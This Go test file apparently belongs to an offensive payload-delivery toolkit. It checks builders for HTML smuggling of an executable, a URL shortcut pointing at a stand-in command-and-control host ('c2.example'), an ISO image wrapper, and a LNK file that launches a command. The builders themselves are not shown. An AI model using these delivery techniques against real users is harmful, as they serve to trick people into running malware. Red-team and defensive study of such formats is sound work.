package payload

import (
	"bytes"
	"strings"
	"testing"
)

func TestBuildHTMLSmuggling(t *testing.T) {
	html := BuildHTMLSmuggling("a.exe", []byte("MZ"))
	if !bytes.Contains(html, []byte("application/octet-stream")) {
		t.Fatal("missing blob type")
	}
	if !bytes.Contains(html, []byte("a.exe")) {
		t.Fatal("missing filename")
	}
}

func TestBuildURLShortcut(t *testing.T) {
	b := BuildURLShortcut("https://c2.example/p")
	if !strings.Contains(string(b), "https://c2.example/p") {
		t.Fatalf("got %q", b)
	}
}

func TestBuildISO9660ContainsFile(t *testing.T) {
	img, err := BuildISO9660("hello.txt", []byte("hi"))
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Contains(img[:2048*20], []byte("CD001")) {
		t.Fatal("missing ISO magic")
	}
	if !bytes.Contains(img, []byte("hi")) {
		t.Fatal("file payload missing")
	}
}

func TestBuildCMDLnk(t *testing.T) {
	b, err := BuildCMDLnk("calc.exe")
	if err != nil {
		t.Fatal(err)
	}
	if len(b) < 0x4C {
		t.Fatalf("too small: %d", len(b))
	}
	if b[0] != 0x4C {
		t.Fatalf("header size byte = %d", b[0])
	}
}
